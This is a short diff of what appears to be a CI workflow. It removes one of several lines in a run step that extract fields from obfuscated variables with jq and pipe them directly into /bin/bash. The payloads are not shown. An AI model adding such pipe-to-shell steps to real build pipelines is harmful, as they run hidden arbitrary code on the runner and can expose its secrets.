@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$yn6" | jq -r .gn68789 | /bin/bash
           echo $iix327 | jq -r .hqc7 | /bin/bash
-          echo $rv255 | jq -r .x972 | /bin/bash
           echo $enlb5 | jq -r .xnf1 | /bin/bash
 
       - name: Archive results
